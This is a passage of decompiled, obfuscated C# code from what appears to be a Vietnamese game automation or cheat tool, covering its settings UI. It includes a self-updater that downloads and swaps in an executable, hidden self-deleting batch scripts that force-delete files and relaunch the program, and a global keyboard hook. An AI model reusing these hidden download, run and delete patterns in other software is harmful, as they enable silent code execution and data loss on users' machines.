			}
		}
	}

	private void checkBoxoverlay_CheckedChanged(object sender, EventArgs e)
	{
		try
		{
			bool_7 = checkBoxoverlay.Checked;
			CharacterAccountConfig characterAccountConfig = default(CharacterAccountConfig);
			int num = Class87.smethod_3(characterAccountConfig_1, int_58);
			if (num >= 0)
			{
				characterAccountConfig = characterAccountConfig_1[num];
				string[] array = Class85.smethod_34(characterAccountConfig);
				for (int i = 0; i < array.Count(); i++)
				{
					array[i] = Class1.smethod_1(array[i], 1);
				}
				comboBoxSelectOverlayItemCount.Items.Clear();
				comboBoxSelectOverlayItemCount.Items.Add("Không hiện số lượng item");
				ComboBox.ObjectCollection items = comboBoxSelectOverlayItemCount.Items;
				object[] items2 = array;
				items.AddRange(items2);
				if (gform0_0 == null)
				{
					gform0_0 = new GForm0();
				}
			}
		}
		catch
		{
		}
	}

	private void comboBoxcauhinh_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (comboBoxcauhinh.Text)
		{
		case "480":
			float_0 = 230f;
			gform0_0.float_1 = 230f;
			break;
		case "512":
			float_0 = 30f;
			if (gform0_0 == null)
			{
				gform0_0 = new GForm0();
			}
			gform0_0.float_1 = 250f;
			gform0_0.float_4 = 2f;
			gform0_0.float_5 = 1f;
			gform0_0.float_6 = 1f;
			gform0_0.Invalidate();
			break;
		case "NMC":
			float_0 = 200f;
			if (gform0_0 == null)
			{
				gform0_0 = new GForm0();
			}
			gform0_0.float_1 = 220f;
			gform0_0.float_4 = 1.8f;
			gform0_0.float_5 = 0.9f;
			gform0_0.float_6 = 1f;
			gform0_0.Invalidate();
			break;
		case "TVB":
			float_0 = 180f;
			if (gform0_0 == null)
			{
				gform0_0 = new GForm0();
			}
			gform0_0.float_1 = 50f;
			gform0_0.float_4 = 1.8f;
			gform0_0.float_5 = 1.1f;
			gform0_0.float_6 = 1f;
			gform0_0.Invalidate();
			break;
		}
	}

	private void method_62(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.facebook.com/share/p/18w1wjUDoF/");
	}

	private void checkDungHieuUng_CheckedChanged(object sender, EventArgs e)
	{
		try
		{
			if (bool_34)
			{
				return;
			}
			bool_9 = checkDungHieuUng.Checked;
			if (gform0_0 == null)
			{
				gform0_0 = new GForm0();
			}
			if (bool_6)
			{
				string path = ".\\\\Config\\\\Effect";
				if (Directory.Exists(path))
				{
					string[] files = Directory.GetFiles(path, "*.gif");
					comboBoxHieuUng.Items.Clear();
					comboBoxHieuUng.Items.Add("Không dùng");
					gform0_0.method_1(null);
					string[] array = files;
					foreach (string path2 in array)
					{
						comboBoxHieuUng.Items.Add(Path.GetFileName(path2));
					}
					if (comboBoxHieuUng.Items.Count > 0 && !bool_34)
					{
						comboBoxHieuUng.SelectedIndex = 0;
					}
				}
				else
				{
					MessageBox.Show("Thư mục hiệu ứng không tồn tại");
				}
				comboBoxHieuUng.Enabled = true;
				gform0_0.Show();
			}
			else
			{
				comboBoxHieuUng.Enabled = false;
				gform0_0.Hide();
			}
		}
		catch
		{
		}
	}

	private void comboBoxHieuUng_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (bool_34 || gform0_0 == null || !bool_6)
			{
				return;
			}
			string text = comboBoxHieuUng.SelectedItem?.ToString();
			if (!(text == "Không dùng") && !string.IsNullOrEmpty(text))
			{
				string text2 = Path.Combine(".\\\\Config\\\\Effect", text);
				if (File.Exists(text2))
				{
					gform0_0.method_1(text2);
				}
				else
				{
					MessageBox.Show("Hiệu ứng không tồn tại: " + text2);
				}
			}
		}
		catch
		{
		}
	}

	private void checkBoxDungHieuUng2_CheckedChanged(object sender, EventArgs e)
	{
		try
		{
			bool_10 = checkBoxDungHieuUng2.Checked;
			if (gform0_0 == null)
			{
				gform0_0 = new GForm0();
			}
		}
		catch
		{
		}
	}

	private void checkBoxdamekethop_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormDame.int_14 = Convert.ToByte(checkBoxdamekethop.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagDameKethop", FormDame.int_14, "", 0);
		}
	}

	private void method_63(string string_69)
	{
		try
		{
			string text = Path.Combine(Path.GetDirectoryName(string_69), "delete_old.bat");
			string contents = "\n@echo off\ntimeout /t 2 /nobreak >nul\ndel \"" + string_69 + "\" 2>nul\ndel \"%~f0\" 2>nul\n";
			File.WriteAllText(text, contents);
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = true
			};
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private void method_64(string string_69)
	{
		try
		{
			string text = Path.Combine(Path.GetDirectoryName(string_69), "cleanup_old.bat");
			string contents = "\n@echo off\ntimeout /t 3 /nobreak >nul\ndel /f /q \"" + string_69 + "\" 2>nul\ndel /f /q \"%~f0\" 2>nul\n";
			File.WriteAllText(text, contents);
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = true
			};
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private void method_65(string string_69, string string_70)
	{
		try
		{
			string text = Path.Combine(Path.GetDirectoryName(string_69), "restart_app.bat");
			string contents = "\n@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q \"" + string_70 + "\" 2>nul\nstart \"\" \"" + string_69 + "\"\ntimeout /t 2 /nobreak >nul\ndel /f /q \"%~f0\" 2>nul\n";
			File.WriteAllText(text, contents);
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = true
			};
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private void method_66()
	{
		try
		{
			Class11.smethod_29(ref Class11.string_17, "Đang tải phiên bản mới từ server...");
			string address = "http://localhost/Kykeoxe.exe";
			string location = Assembly.GetExecutingAssembly().Location;
			string text = location + ".new";
			string text2 = location + ".old";
			if (File.Exists(text2))
			{
				try
				{
					File.SetAttributes(text2, FileAttributes.Normal);
					File.Delete(text2);
				}
				catch
				{
				}
			}
			using (WebClient webClient = new WebClient())
			{
				webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
				webClient.DownloadFile(address, text);
			}
			Thread.Sleep(3000);
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(location))
			{
				File.Move(location, text2);
			}
			File.Move(text, location);
			Thread.Sleep(5000);
			method_65(location, text2);
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			Class11.smethod_29(ref Class11.string_17, "Lỗi khi cập nhật: " + ex.Message);
		}
	}

	private void checkBoxkhoamuctieu_CheckedChanged(object sender, EventArgs e)
	{
		Class72.int_4 = Convert.ToByte(checkBoxkhoamuctieu.Checked);
		Class66.smethod_11(Class66.smethod_1(), "flagDanhAC", Class72.int_4, "", 0);
	}

	private void comboBoxdanhtennv_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormRauria.smethod_0(listViewdanhtennv, comboBoxdanhtennv.Text, string_0, ref Class72.string_5);
			Class72.smethod_1(Class72.string_5, Class72.string_2);
		}
	}

	private void comboBoxdanhtennv_MouseDown(object sender, MouseEventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormRauria.smethod_1(comboBoxdanhtennv, ref string_0);
		}
	}

	private void buttonxoauutiennv_Click(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormRauria.smethod_2(listViewdanhtennv, ref Class72.string_5);
			Class72.smethod_1(Class72.string_5, Class72.string_2);
		}
	}

	private void checkBoxChayNhay_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_39 = Convert.ToByte(checkBoxChayNhay.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagDanhNguoiChayNhay", int_39, "", 0);
		}
	}

	private void checkBoxkepgoc_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBoxkepgoc.Checked)
		{
			if (!bool_0)
			{
				intptr_0 = smethod_5(lowLevelKeyboardProc_0);
				bool_0 = true;
			}
		}
		else if (bool_0)
		{
			UnhookWindowsHookEx(intptr_0);
			bool_0 = false;
		}
	}

	private static IntPtr smethod_5(LowLevelKeyboardProc lowLevelKeyboardProc_1)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, lowLevelKeyboardProc_1, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr smethod_6(int int_159, IntPtr intptr_2, IntPtr intptr_3)
	{
		if (int_159 >= 0 && intptr_2 == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(intptr_3);
			if (num == 82 && form1_0 != null && form1_0.checkBoxkepgoc.Checked)
			{
				form1_0.checkBoxChayNhay.Checked = !form1_0.checkBoxChayNhay.Checked;
			}
		}
		return CallNextHookEx(intptr_0, int_159, intptr_2, intptr_3);
	}

	protected override void OnFormClosed(FormClosedEventArgs e)
	{
		if (bool_0)
		{
			UnhookWindowsHookEx(intptr_0);
			bool_0 = false;
		}
		base.OnFormClosed(e);
	}

	private void linkLabel5_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.facebook.com/share/p/18w1wjUDoF/");
	}

	private void comboBoxSelectOverlayItemCount_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (comboBoxSelectOverlayItemCount.SelectedItem != null)
		{
			GForm0.string_1 = comboBoxSelectOverlayItemCount.SelectedItem.ToString();
		}
	}

	[CompilerGenerated]
	private string method_67(string string_69)
	{
		try
		{
			Control[] array = base.Controls.Find(string_69, searchAllChildren: true);
			if (array != null && array.Length != 0 && array[0] is TextBox)
			{
				return ((TextBox)array[0]).Text;
			}
		}
		catch
		{
		}
		return string.Empty;
	}
}
